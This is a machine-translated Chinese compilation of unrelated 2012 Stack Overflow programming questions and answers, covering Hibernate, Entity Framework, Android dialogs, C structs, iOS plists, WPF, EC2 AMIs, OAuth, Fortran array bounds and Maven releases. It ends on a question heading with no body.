这是一个工作示例：http: [//jsfiddle.net/529Lk/](http://jsfiddle.net/529Lk/)

# .net - REST 服务的单路由或多路由哪个更好？

> ID：11553201
> 
> 赞同：0
> 
> 时间：2012-07-19T02:43:03.687
> 
> 标签：.net, wcf, rest, iis

我有多租户 SaaS 应用程序，在启动时我设置如下路由：

```
https://my.com/customer1/mobile 
https://my.com/customer1/integration
https://my.com/customer2/mobile 
https://my.com/customer2/integration
https://my.com/customer3/mobile 
https://my.com/customer3/integration
https://my.com/customer4/mobile 
https://my.com/customer4/integration 
```

当我添加新客户时，我必须回收池以便重建路由。我不确定这是否是我正在做的最好的方法......

我只能创建 2 条路线

```
https://my.com/mobile 
https://my.com/integration 
```

然后在 HTTP 标头中传递 AccountId 以及我的身份验证信息。会不会更干净？您如何看待性能，减少路线应该是有益的，对吗？

# hibernate - java.lang.NoSuchMethodError：org.hibernate.cfg.Environment.verifyProperties

> ID：11553202
> 
> 赞同：2
> 
> 时间：2012-07-19T02:43:04.840
> 
> 标签：hibernate

在尝试构建会话工厂时，我得到了这个。很少出现在互联网搜索中。但这几天让我死在水里。谢谢。

```
java.lang.NoSuchMethodError: org.hibernate.cfg.Environment.verifyProperties(Ljava/util/Map;)V
at   org.hibernate.service.ServiceRegistryBuilder.buildServiceRegistry(ServiceRegistryBuilder.java:244) 
```

使用休眠版本：

```
<dependency>
  <groupId>org.hibernate</groupId>
  <artifactId>hibernate-c3p0</artifactId>
  <version>4.1.1.Final</version>
  <type>jar</type>
</dependency>
<dependency>
  <groupId>org.hibernate</groupId>
  <artifactId>hibernate-entitymanager</artifactId>
  <version>4.1.1.Final</version>
</dependency> 
```

* * *

```
public class HibernateUtils {

private static final String DATABASE_HOST = "host_to_db";

private static SessionFactory factory;
private static ServiceRegistry serviceRegistry;

public static void init() {
Configuration config = getConfiguration();
config.configure();

serviceRegistry = new ServiceRegistryBuilder().applySettings(
config.getProperties()).buildServiceRegistry();

config.setSessionFactoryObserver(new SessionFactoryObserver() {

@Override
public void sessionFactoryCreated(SessionFactory factory) { }

@Override
public void sessionFactoryClosed(SessionFactory factory) {
ServiceRegistryBuilder.destroy(serviceRegistry);
}
});

factory = config.buildSessionFactory(serviceRegistry);
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-13T17:19:58.443

您与 hibernate-core.jar 版本有冲突，Map 版本仅在更高版本中添加（可能是 4.2.X 左右？），请检查您的 Eclipse/Maven 'Dependency Hierarchy' 选项卡以分析版本冲突。

```
public static void verifyProperties(Map<?,?> configurationValues) 
```

仅当我删除本地 Hibernate Maven 存储库并再次运行安装时，我的问题才得到解决。

# entity-framework-4 - 实体框架中有多少个代码生成模板

> ID：11553204
> 
> 赞同：0
> 
> 时间：2012-07-19T02:43:19.303
> 
> 标签：entity-framework-4

据我了解。在 EF 的数据库优先模式中。我们可以通过一些模板为实体类生成代码。例如 T4 模板、DbContext 生成器模板等。但我也可以在 Designer.cs 文件中找到相同的实体类定义。这是我的问题。

1.  EF 代码生成器的目的是什么？Designer.cs 文件具有所有定义良好的实体类。是否需要一一生成实体类代码？

2.  EF 中有多少个模板？它们之间有什么区别？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T02:50:22.790

EF 电动工具允许您为现有数据库生成代码优先实体。

您将使用此方法而不是数据库优先 (EDMX) 方法的原因是，从现在开始，您希望使用代码优先来管理数据库更新。这意味着您可以使用 EF 迁移，而不是直接对数据库进行更改然后更新您的 EDMX。

对于从数据库生成代码文件的其他应用程序，所有 EF 方法最终都会生成代码（不仅仅是代码优先），但是只有代码优先可以让您控制生成的类（尽管您可以使用带有 EDMX 生成的部分类）。模型和数据库优先方法依赖于在模型/数据库更改时重新生成类。

据我所知，EF 电动工具是从现有数据库生成代码优先模型的最佳方式（也是唯一的微软方式）

# android - 带有 EditText 的对话框

> ID：11553222
> 
> 赞同：-3
> 
> 时间：2012-07-19T02:46:01.590
> 
> 标签：android, android-edittext, android-dialog

我正在尝试制作一个用户`Dialog`将`EditText`在其中键入的内容，然后单击“确定”。

我找不到任何此类`Dialog`（文本到语音翻译）的示例

你能指点我参考或提供一个例子吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T02:57:08.850

您可以使用[AlertDialog.Builder](http://developer.android.com/reference/android/app/AlertDialog.Builder.html)自定义警报对话框。特别是该`setView()`方法将允许您将视图添加到对话框中，在本例中为 EditText。

```
EditText et = new EditText(this);
AlertDialog.Builder builder = new AlertDialog.Builder(this);
builder.setView(et)
.setPositiveButton("Yes",new DialogInterface.OnClickListener() {
    public void onClick(DialogInterface dialog,int id) {
        String input = et.getText().toString();
                //do something with input
        }
});
AlertDialog ad = builder.create();
ad.show(); 
```

# c - C 指针作为结构成员、分配、初始化

> ID：11553224
> 
> 赞同：0
> 
> 时间：2012-07-19T02:46:30.907
> 
> 标签：c, pointers, structure, dynamic-allocation

我正在研究代数应用程序，这是代码

```
struct quotient
{
    int numerator;
    int denominator;
};

struct term
{
    struct quotient coefficient;
    char varname;
    struct quotient power;
};

struct function
{
    struct term* terms;
    char* operators;
    struct quotient coefficient;
    struct quotient power;
};

//Constructor Functions
struct quotient NewQuotient()
{
    struct quotient temp;
    printf("Enter the numerator\n");
    scanf("%d", &temp.numerator);
    printf("Enter the denominator\n");
    scanf("%d", &temp.denominator);
    return temp;
}

char NewVarname()
{
    char temp;
    printf("Enter the variable letter: \n");
    scanf("%c", &temp);
    return temp;
}

struct term NewTerm()
{
    //broken, won't let you enter a variable name, sets it to x by default until that's     resolved
    struct term temp;
    printf("Enter the coefficient: ");
    temp.coefficient = NewQuotient();
    printf("Enter the variable name: \n");
    temp.varname = NewVarname();
    temp.varname = 'x';
    printf("Enter the power: ");
    temp.power = NewQuotient();
    return temp;
}

void NewFunction(struct function* func, int size)
{
    //so far so good
    unsigned i;
    func->terms = (struct term*)calloc(size, sizeof(struct term));
    //loop to initialize each term
    for(i = 0; i < size; i++)
    {
        func->terms[i] = NewTerm();
    }
    return;
}

int main(){
    struct function fofx;
    NewFunction(&fofx, 2);
    DisplayFunction(&fofx, 2);
    DeleteFunction(&fofx);

    return 0;
} 
```

这是输出：

> 输入分子：
> 1
> 输入分母：
> 2
> 输入分子：
> 3
> 输入分母：
> 4
> ....

等等，直到循环结束。

NewTerm 中的一半语句似乎根本没有执行，但程序似乎成功分配并初始化了一个新函数。非常感谢任何帮助，我对此感到非常困惑。我没有包括显示和删除功能，它们工作正常，但如果它们有帮助，我可以在这里添加它们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-21T00:39:08.003

使用时`scanf`，您通常希望获取 Return 键以及数字。

你有：

```
scanf("%d", &temp.numerator); 
```

你真的想要：

```
scanf("%d\n", &temp.numerator); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T03:14:12.710

您没有为 calloc 提供正确的大小，应该是`sizeof (struct term)`而不是`sizeof (int)`. `struct term`这可能是问题所在，具体取决于`size`.

关于`NewTerm`不被调用，那可能是因为你没有调用它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-21T01:39:07.950

您还应该使用验证来确保只输入数字，否则您会得到古怪的结果。

# ios - 写入 plist 文件不写入

> ID：11553226
> 
> 赞同：1
> 
> 时间：2012-07-19T02:46:39.523
> 
> 标签：ios, int, plist, nsdictionary

我想从 plist 文件中检索一个整数，将其递增，然后将其写回 plist 文件。在“Levels.plist”文件中有一行，键`LevelNumber`为 ，值为`1`。我使用此代码来检索值：

```
NSString *filePath = [[NSBundle mainBundle]pathForResource:@"Levels.plist" ofType:@"plist"];;
    NSMutableDictionary* plistDict = [[NSMutableDictionary alloc] initWithContentsOfFile:filePath];
    lvl = [[plistDict objectForKey:@"LevelNumber"]intValue];
    NSLog(@"%i", [[plistDict objectForKey:@"LevelNumber"]intValue]); 
```

当我运行它时，我得到控制台输出 0。有人能告诉我我做错了什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T02:59:23.507

听起来您需要在此过程中进行大量错误检查。

也许是这样的：

```
NSString *filePath = [[NSBundle mainBundle]pathForResource:@"Levels" ofType:@"plist"];
if(filePath)
{
    NSMutableDictionary* plistDict = [[NSMutableDictionary alloc] initWithContentsOfFile:filePath];
    if(plistDict)
    {
        NSNumber * lvlNumber = [plistDict objectForKey:@"LevelNumber"];
        if(lvlNumber)
        {
            NSInteger lvl = [lvlNumber integerValue];

            NSLog( @"current lvl is %d", lvl );

            // increment the found lvl by one
            lvl++;

            // and update the mutable dictionary
            [plistDict setObject: [NSNumber numberWithInteger: lvl] forKey: @"LevelNumber"];

            // then attempt to write out the updated dictionary
            BOOL success = [plistDict writeToFile: filePath atomically: YES];
            if( success == NO)
            {
                NSLog( @"did not write out updated plistDict" );
            }
        } else {
            NSLog( @"no LevelNumber object in the dictionary" );
        }
    } else {
        NSLog( @"plistDict is NULL");
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T03:13:53.610

```
NSString *filePath = [[NSBundle mainBundle] 
          pathForResource:@"Levels.plist" ofType:@"plist"];

NSMutableDictionary* plistDict = [[NSMutableDictionary alloc]
                          initWithContentsOfFile:filePath];
lvl = [[plistDict objectForKey:@"LevelNumber"]intValue];
NSLog(@"%i", [[plistDict objectForKey:@"LevelNumber"]intValue]); 
```

我的猜测是 NSBundle 会为`pathForResource:ofType:`调用返回 nil，除非您实际上已将文件命名为“Levels.plist.plist”。

请记住，如果该方法恰好返回`nil`，您的其余代码仍然可以继续。给定一个`nil`文件路径，`NSMutableDictionary`将返回 nil，随后从字典中获取对象的调用也将返回`nil`，因此您的日志调用显示输出为 0。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-24T19:25:04.627

我发现这种方法对于实际设备本身并不传统。[此处](https://stackoverflow.com/questions/4132477/iphone-sdkcan-write-data-to-plist-on-simulator-but-cant-do-same-thing-at-devic?rq=1)描述了您需要做的事情，并且[该网站](http://ipgames.wordpress.com/tutorials/writeread-data-to-plist-file/)说明了如何在实际设备上执行此操作

# ios - iOS 通过故事板将 UIView 锁定在导航栏下方和 UITableView 上方

> ID：11553229
> 
> 赞同：0
> 
> 时间：2012-07-19T02:46:50.783
> 
> 标签：ios, uiview, uitableview, uistoryboard

我已经使用`storyboard`来布置我的 GUI 对象。所以我有一个`UITableViewController`包含一个表格视图和一个导航栏。表视图包含一个视图和表视图单元格。视图包含 a `UITextField`、 a`UIButton`和 a `UILabel`。

当应用程序运行时，一切都会显示我想要的效果，并且视图位于导航栏下方和表格的第一个单元格上方。滚动时会出现问题。视图（带有文本字段、按钮和标签）也在滚动。我希望将视图锁定到位，并希望表格单元格在其下方滚动。

我认为我可能需要在文件中实现一些代码`scrollViewDidScroll`：`UITableViewController .m`但我真的不确定。我更喜欢一种解决方案，它允许我使用`storyboard`来布置我的 GUI 对象，然后将它们与一些支持代码连接起来，而不是以编程方式完成整个事情。

我将在其中包含我如何布置内容的图像，`storyboard`但作为新用户，我不允许:-(

提前致谢 ：-）

PS：如果您尝试将`UIView`外部从内部拖出，`UITableViewController`那么 IB 会将视图与 First Responder 和 View Controller 置于同一级别，然后我什至看不到`UIView`我是否运行该应用程序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T02:49:55.460

尝试使用 a`UIViewController`而不是 a`UITableViewController`并像没有 Storyboard 一样创建和管理表格视图。我在我目前正在开发的应用程序中发生了这种情况，这是我能找到的唯一解决方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T02:56:40.670

实际上，您可以将视图从`UITableViewController`. 但请确保您不是`UITableViewController`通过拖动`UITableViewController`from直接创建的`storyboard`。您可以创建一个新`UIViewController`的并将 a`tableview`和 a`view`拖入其中。记得将 的`delegate`和设置`datasource`为。然后视图被锁定在那里。`tableview``UIViewController`

# wpf - 如何在 UserControl 中实现 DependencyProperty 以更新 LostFocus 上的源？

> ID：11553231
> 
> 赞同：0
> 
> 时间：2012-07-19T02:47:44.250
> 
> 标签：wpf, user-controls, dependency-properties, updatesourcetrigger

我正在实现一个`UserControl`名为 PhoneBox，它包含一个单一的`TextBox`、一些自定义逻辑，并且有一个名为 PhoneNo 的 DependencyProperty。`LostFocus`它将在带有for的双向绑定场景中使用`UpdateSourceTrigger`。所以我写了以下代码 -

XAML（用户控件）：

```
<StackPanel>
    <TextBox Name="txtPhone" MinWidth="120" MinHeight="23" LostFocus="txtPhone_LostFocus" GotFocus="txtPhone_GotFocus"/>
</StackPanel> 
```

代码隐藏（用户控件）：

```
public partial class PhoneBox : UserControl
{
    //Some Code

    static PhoneBox()
    {
        FrameworkPropertyMetadata phoneNoMetadata =
            new FrameworkPropertyMetadata(new PropertyChangedCallback(OnPhoneNoChanged),
                                          new CoerceValueCallback(CoercePhoneNoValue));
        PhoneNoProperty = DependencyProperty.Register("PhoneNo", typeof (string), typeof (PhoneBox),
                                                       phoneNoMetadata,
                                                       new ValidateValueCallback(ValidatePhoneNoValue));
    }

    public readonly static DependencyProperty PhoneNoProperty;
    public string PhoneNo
    {
        get { return (string)GetValue(PhoneNoProperty); }
        set { SetValue(PhoneNoProperty, value); }
    }

    private static void OnPhoneNoChanged(DependencyObject d, DependencyPropertyChangedEventArgs e)
    {
        PhoneBox phoneBox = (PhoneBox)d;
        string newValue = (string)e.NewValue;

        phoneBox.txtPhone.Text = newValue;
    }

    private static object CoercePhoneNoValue(DependencyObject d, object basevalue)
    {
        return basevalue;
    }

    private static bool ValidatePhoneNoValue(object value)
    {
        return true;
    }

    private void txtPhone_LostFocus(object sender, RoutedEventArgs e)
    {
        this.SetValue(PhoneNoProperty, this.txtPhone.Text);
    }

    private void txtPhone_GotFocus(object sender, RoutedEventArgs e)
    {
        if (!String.IsNullOrEmpty(txtPhone.Text))
            this.txtPhone.Text = this.FilterText(txtPhone.Text);
    }

    private string FilterText(string text)
    {
        //Some cutom logic
    }

    //Some more Code
} 
```

XAML（消费者）：

```
<pbc:PhoneBox PhoneNo="{Binding Path=User.Phone, Mode=TwoWay, UpdateSourceTrigger=LostFocus}"/> 
```

有用。但我的问题是，我使用`txtPhone_LostFocus`事件处理程序设置属性值（进而更新源）的方式是否合适？有没有更合适的方法来做到这一点？我是这个`DependencyProperty`东西的新手，所以任何指导，建议，评论将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-25T07:25:06.713

处理这种情况的 WPF 方法是在 UserControl`DependencyProperty`和`TextBox`UserControl 的 XAML 文件中声明的之间建立一个绑定。这也是您要设置的地方`LostFocus UpdateSourceTrigger`（您不必这样做，因为它是默认行为）。您将在`TextBox`（即在 UserControl 内部）声明绑定，因此使用 UserControl 的客户端代码可以自由地在 PhoneNo 属性上设置另一个绑定（从 UserControl 外部）。此外，如果您的 CoerceValue 回调只返回基值，最好从一开始就没有它。

这可能是大卫最初的意思......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T07:52:44.173

在这种情况下，我确实宁愿使用`UpdateSourceTrigger`DP 元数据中的枚举而不是`LostFocus`EventHandler，并摆脱所有冗余方法：如果可以的话，让 WPF 为您做这些事情总是更好：它会做得更好并且快点。

另外，在这种情况下，我个人发现在元数据中读取比在 lostFocus 方法中容易得多。但我想这是一个品味问题。

**编辑：**不不，我明白你的意思，但我自己的回答可能并不清楚。这大致是我会做的（只是给你一个提示，这需要在你的情况下进行一些调整）：

```
public partial class PhoneBox : UserControl
{
    public static readonly DependencyProperty PhoneNoProperty = DependencyProperty.Register(
        "PhoneNo",
        typeof (string),
        typeof (PhoneBox),
        new UIPropertyMetadata(UpdateSourceTrigger.LostFocus),
        new ValidateValueCallback(ValidatePhoneNoValue));

    public string PhoneNo
    {
        get { return (string)GetValue(PhoneNoProperty); }
        set { SetValue(PhoneNoProperty, value); }
    }

// ... your code here.

} 
```

# java - Google App Engine (Java) 中的水印图像

> ID：11553232
> 
> 赞同：0
> 
> 时间：2012-07-19T02:47:48.130
> 
> 标签：java, google-app-engine, watermark, blobstore

如何使用 AppEnginge 中的 ImageService 在图像上添加水印。图像上传到 blobstore 然后提供。简单的文本水印就可以了。

对此有任何参考吗？谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T06:35:02.733

您可以使用 来执行此操作[`ImagesServiceFactory.makeComposite`](https://developers.google.com/appengine/docs/java/javadoc/com/google/appengine/api/images/ImagesServiceFactory#makeComposite%28com.google.appengine.api.images.Image,%20int,%20int,%20float,%20com.google.appengine.api.images.Composite.Anchor%29)，它允许您指定要合成到画布（基础图像）上的图像的 X 和 Y 位置以及不透明度。只需将您的水印图像作为您的应用可以使用的资源来访问[`ImagesServiceFactory.makeImageFromFilename`](https://developers.google.com/appengine/docs/java/javadoc/com/google/appengine/api/images/ImagesServiceFactory#makeImageFromFilename%28java.lang.String%29)。

# amazon-ec2 - 如何在同一个 EC2 实例上创建另一个 AMI

> ID：11553235
> 
> 赞同：2
> 
> 时间：2012-07-19T02:47:56.820
> 
> 标签：amazon-ec2

我在 AWS EC2 上执行以下操作：

1.  启动一个 EBS 支持的 EC2 实例 i-1
2.  自定义它并创建一个 AMI，假设它是 AMI-1
3.  在我对 i-1 实例进行进一步更改后，我再次在该实例上创建一个新的 AMI
4.  我希望我现在会得到两张图像，分别是 AMI-1 和 AMI-2。
5.  但似乎只创建了 AMI-2，原来的 AMI-1 现在消失了。属于 AMI-1 的快照仍然存在。真奇怪。

基本上我想知道：

1.  那么这是 EC2 上自定义 AMI 的正常行为吗？
2.  如果有什么方法可以让我在同一个实例上创建多个 AMI？
3.  AMI-2创建后，基于AMI-1运行的实例是否会受到影响？

提前致谢。我无法从 Google 或 EC2 文档中弄清楚。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-19T06:21:18.393

*   您可以从单个实例创建多个 AMI。

*   除非您明确取消注册 AMI，否则 AMI 不会消失。

*   如果您取消注册 AMI，它不会影响从该 AMI 启动的任何正在运行的实例。

# iphone - 如何以编程方式锁定 Iphone

> ID：11553237
> 
> 赞同：1
> 
> 时间：2012-07-19T02:48:01.840
> 
> 标签：iphone, ios, actionscript-3, flex4

是否有任何选项可以通过软件代码锁定 Iphone。目前我在 Flex 4 工作。我对这项工作一无所知。其实我的iphone被厚厚的面板盖住了，很难按锁键。所以我打算通过编码创建一个锁定 Iphone 的快捷方式。请给我一些关于这个任务的想法，使用 Flex 4 或其他语言也可以。提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T02:52:24.367

使用 flex 或 iOS SDK 无法做到这一点。但是，您可以启用 AssistiveTouch，方法是进入`Settings -> General -> Accessibility -> AssistiveTouch`其中会在屏幕上放置一个小按钮，点击该按钮后，您可以锁定设备

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-20T07:19:59.253

如果你想这样做，苹果永远不会批准这个，你的应用程序必须越狱。您可以通过在项目上调用 Private 框架来做到这一点。你可以使用`GraphicsServices.framework`. 注意，这`GraphicsServices.framework`是一个私有框架。Apple 从不接受您的应用程序。通过调用`GSEventLockDevice()`方法，您可以轻松锁定您的 iPhone 设备。这`GSEventLockDevice()`驻留在`GSEvent.h`. 希望这个有帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-19T02:51:45.910

您不能在未越狱的设备上执行此操作 - Apple 不会让您这样做。即使您确实找到了一种方法来做到这一点，它也永远不会通过提交过程。如果你是为越狱设备开发，那就另当别论了，但对于 App Store，你想要的却是不可能的。

# python - 如何使用 oauth2 for Python 为 Oauth 提供程序指定参数？

> ID：11553241
> 
> 赞同：3
> 
> 时间：2012-07-19T02:48:36.733
> 
> 标签：python, oauth-2.0

[Python`oath2`库](https://github.com/simplegeo/python-oauth2/)的文档提供了一个非常简单的示例来说明如何向 Twitter 进行身份验证：

```
import oauth2 as oauth

# Create your consumer with the proper key/secret.
consumer = oauth.Consumer(key="your-twitter-consumer-key", 
    secret="your-twitter-consumer-secret")

# Request token URL for Twitter.
request_token_url = "http://twitter.com/oauth/request_token"

# Create our client.
client = oauth.Client(consumer)

# The OAuth Client request works just like httplib2 for the most part.
resp, content = client.request(request_token_url, "GET")
print resp
print content 
```

但是，如何指定额外的参数？例如，Facebook 需要“范围”参数来请求电子邮件地址等数据。此外，是否有使用除 Twitter 之外的其他提供商的示例，例如 Facebook 或 Google OAuth2？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:04:31.960

通过查看`oath2`lib的代码，`client.request()`可以找到附加参数的位置：

```
def request(self, uri, method="GET", body='', headers=None, 
        redirections=httplib2.DEFAULT_MAX_REDIRECTS, connection_type=None):

        ...

        if is_form_encoded and body:
            parameters = parse_qs(body)
        else:
            parameters = None 
```

似乎`body`参数将被解析为参数。我从 fb 开发站点复制以下 fb oauth 请求示例。我认为在 之后添加部分`?`，其中包括范围参数，作为`body`参数应该可以工作。

```
https://www.facebook.com/dialog/oauth?
    client_id=YOUR_APP_ID
   &redirect_uri=YOUR_REDIRECT_URI
   &scope=COMMA_SEPARATED_LIST_OF_PERMISSION_NAMES
   &state=SOME_ARBITRARY_BUT_UNIQUE_STRING 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-21T19:49:49.970

参数可以是元组列表，例如：

```
[("language","pt")] 
```

# c# - 将带有 C 和 asm 代码的程序转换为 DLL

> ID：11553248
> 
> 赞同：1
> 
> 时间：2012-07-19T02:49:59.850
> 
> 标签：c#, c, dll, assembly

我的算法包含 C 和 asm 代码。我需要在 C# 应用程序中调用此算法。我想知道是否可以将 C 和 asm 代码转换为 DLL，然后在 C# 控制台应用程序中调用它。但是我很不清楚如何将耦合的 C 和 asm 代码算法转换为 DLL。任何帮助表示赞赏。

我知道如何使用 PInvoke 在 C# 中调用 DLL。我的问题是将组合的 C 和 asm 代码转换为 DLL。当我尝试使用 extern "C" 和 dllexport 时，VS 2010 不断出现错误。有超过90个错误！！大多数错误是那些抱怨 C++ 不支持我使用过的东西的错误（尽管它们在 C 中有效）。例如，这行代码：

```
const u8 *error_string_base="ERROR: "; 
```

给出一个

> *错误 C4430：假定缺少类型说明符 -int。注意 C++ 不支持默认整数*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T02:51:14.960

是的，您可以从 C# 调用 DLL 中的非托管代码。

> 平台调用服务 (PInvoke) 允许托管代码调用在 DLL 中实现的非托管函数。

[http://msdn.microsoft.com/en-us/library/aa288468(v=vs.71).aspx](http://msdn.microsoft.com/en-us/library/aa288468(v=vs.71).aspx)

您可能需要查看主题*Calling a DLL Export Directly from C#*

[http://msdn.microsoft.com/en-us/library/aa288468(v=vs.71).aspx#pinvoke_callingdllexport](http://msdn.microsoft.com/en-us/library/aa288468(v=vs.71).aspx#pinvoke_callingdllexport)

**更新**（基于您的编辑）

在 C 模式而不是 C++ 模式下编译您的应用程序

转到属性-> c/c++ -> 高级-> 编译为并选择'c'

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T03:14:57.937

更好的方法是创建一个 Dll 应用程序（COM dll 或其他）并用 VC++ 编写代码，这与 C 非常相似，您也可以像这样合并您的 asm 代码

```
 __asm {
         mov al, 2
         mov dx, 0xD007
         out dx, al
       } 
```

，我的意思是使用**__asm**关键字。创建 dll 应用程序没什么大不了的 .. 网上有很多资源。导入和导出 Dll 有很多限制，这就是为什么你的代码不断呕吐错误。

# bit-manipulation - 我们是将奇偶校验位添加到位集的前面还是后面

> ID：11553254
> 
> 赞同：1
> 
> 时间：2012-07-19T02:50:19.873
> 
> 标签：bit-manipulation, parity, error-detection, error-checking

我们是将奇偶校验位添加到位集的前面还是后面？用于检查一组二进制值的位，其计算方式是使集合中 1 的数量加上奇偶校验位应始终为偶数（或偶尔应始终为奇数）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-19T02:54:25.253

至少在传统的调制解调器通信中，字节的高位用作[奇偶校验位](http://en.wikipedia.org/wiki/Parity_bit)，而 7 个最低位用于编码 ASCII 字符。

所以字母 A 将被编码为

01000001

其中前导 0 是奇偶校验位（假设为*偶校验*）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-19T03:13:20.880

只要你保持一致就没有关系。如果最后，它可以“即时”计算和添加，而无需两次遍历数据。

奇偶校验是一种极弱的错误检测方法。有很多更好的方法。除非您被限制使用奇偶校验，否则您应该寻找可以捕获更多类型错误甚至进行错误纠正的其他选择。

# arrays - 数组索引超出范围

> ID：11553258
> 
> 赞同：3
> 
> 时间：2012-07-19T02:50:46.130
> 
> 标签：arrays, fortran

如果引用数组元素的索引实际上超出了它的假定范围，我很困惑 Fortran 如何处理这种情况。

下面是一个简单的代码来说明这个问题：

```
PROGRAM test_matrix_out

USE mod_writearray

IMPLICIT NONE
INTEGER :: i,j,m,n
REAL    :: k
REAL, Dimension(:,:),ALLOCATABLE :: A

m = 3
n = 4
ALLOCATE(A(m,n))

k = 1

DO i=1,m
    DO j=1,n
        A(i,j)=k
        k=k+1
    ENDDO
ENDDO

CALL writearray(A)
WRITE(*,*)
WRITE(*,*) A(1,:)
WRITE(*,*)
WRITE(*,*) A(2,:)
WRITE(*,*)
WRITE(*,*) A(0,:)
WRITE(*,*)
WRITE(*,*) A(4,:)
WRITE(*,*)
WRITE(*,*) A(5,:)
WRITE(*,*)
WRITE(*,*) A(100,:)
WRITE(*,*)
WRITE(*,*) A(:,1)
WRITE(*,*)
WRITE(*,*) A(:,2)
WRITE(*,*)
WRITE(*,*) A(:,0)
WRITE(*,*)
WRITE(*,*) A(:,4)
WRITE(*,*)
WRITE(*,*) A(:,5)
WRITE(*,*)
WRITE(*,*) A(:,100)

DEALLOCATE(A)

END PROGRAM test_matrix_out 
```

它给了我以下结果：

```
 1.000000       2.000000       3.000000       4.000000

   5.000000       6.000000       7.000000       8.000000

  0.0000000E+00   9.000000       10.00000       11.00000

   2.000000       3.000000       4.000000      0.0000000E+00

   6.000000       7.000000       8.000000      0.0000000E+00

  0.0000000E+00  0.0000000E+00  0.0000000E+00  0.0000000E+00

   1.000000       5.000000       9.000000

   2.000000       6.000000       10.00000

 -1.0097448E-28  8.9776148E-39  0.0000000E+00

   4.000000       8.000000       12.00000

  0.0000000E+00  0.0000000E+00  0.0000000E+00

 -3.3631163E-44  1.4293244E-43  0.0000000E+00 
```

为什么会这样？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-19T06:54:25.530

当您编写 A(i,j) 时，编译器会计算该内存位置的地址。例如，参见[http://en.wikipedia.org/wiki/Array_data_structure#Multidimensional_arrays](http://en.wikipedia.org/wiki/Array_data_structure#Multidimensional_arrays)。编译器通常不会根据语言规则确定这是否是合法地址。使用超出维度的索引是非法的。程序员有责任不这样做。Fortran 的优点之一是能够为该错误添加运行时检查。传统的传说是运行时下标检查很昂贵，但我在测试时经常发现运行时成本可以忽略不计，有时会在程序的生产版本中保留它。

如果您正在读取内存，索引错误的可能后果将是获得错误的值，除非内存位置太远以至于它超出了属于程序的内存，这将产生错误。如果您正在写入内存，您将破坏数组中其他地方的内存，属于其他一些变量，或者属于程序的内部数据结构。看看[没有释放会导致什么样的问题？](https://stackoverflow.com/questions/11334941/what-kind-of-problems-can-lack-of-deallocation-cause/)对于索引错误导致程序运行时问题的示例问题。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-19T04:42:15.427

您所看到的是，您用于编译程序的编译器并未在运行时检查数组是否越界。因此，取决于编译器和机器，任何事情都会发生。有时，可能会引用未在内存中显式分配的数组元素，这就是您的示例中发生的情况。在这种情况下，越界元素的值是程序运行时位于该内存地址的任何值。如果请求的内存地址不存在或无法访问，程序将因分段错误而失败。

我只是在查看当前 Fortran 标准的草案，我找不到任何关于越界访问数组元素是否是已定义行为的声明。为了避免这些问题，请使用`-C`（检查边界）标志编译您的程序。如果可能，该程序将让您知道哪个数组的哪个元素超出了范围。在开发期间使用`-C`，但不要在生产中使用，因为它会极大地减慢代码速度。

此外，为了将来参考，在询问此类问题时（例如，为什么我的程序会输出这个？），最好包括有关正在使用的编译器（带有版本号）和目标体系结构的信息。

# maven - 在构建之前强制声明 GA 时，如何使用 Maven 发布插件？

> ID：11553261
> 
> 赞同：2
> 
> 时间：2012-07-19T02:51:09.297
> 
> 标签：maven, maven-release-plugin

maven 发布插件创建一个标签，更新 poms 以删除快照，构建、部署和设置 poms 中的下一个开发版本，让我们

*   发布版本的标签
*   已发布版本的构建和部署工件
*   下一个版本的开发环境

问题是，当我运行它时，我不知道构建将是 GA 版本，因为它还没有经过 QA 测试和祝福。

大多数人是否开始为每个发布候选者使用发布插件，从而允许在您的存储库中多次重新部署发布版本？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-29T19:55:56.777

使用相同版本重新部署版本不是一个好主意，因为大多数 Maven 安装配置为仅将发布版本下载一次到本地存储库。但还有其他一些选择：

*   您可以为您的候选发布版本提供 1.0.0.RC1 之类的版本。如果你的 QA 说候选版本没问题，你可以
    *   使用您的候选版本的标签并使用 maven-release-plugin 创建 GA 版本（例如 1.0.0.GA）
    *   使用GA 版本的[mvn deploy:deploy-file](http://maven.apache.org/plugins/maven-deploy-plugin/deploy-file-mojo.html)手动重新部署 1.0.0.RC1 的工件
*   有像 Nexus Professional 这样的商业存储库管理器（我不喜欢做广告，所以我不会发布指向它的链接），它们具有发布的暂存功能。如果 QA 发现版本有任何问题，您可以简单地丢弃该版本。如果版本正常，您可以将其推广到您的公司存储库。

# asp.net - 如何在asp.net c#中的水晶报表中获取gridview文本框值

> ID：11553267
> 
> 赞同：1
> 
> 时间：2012-07-19T02:51:36.787
> 
> 标签：asp.net, gridview, crystal-reports, textbox

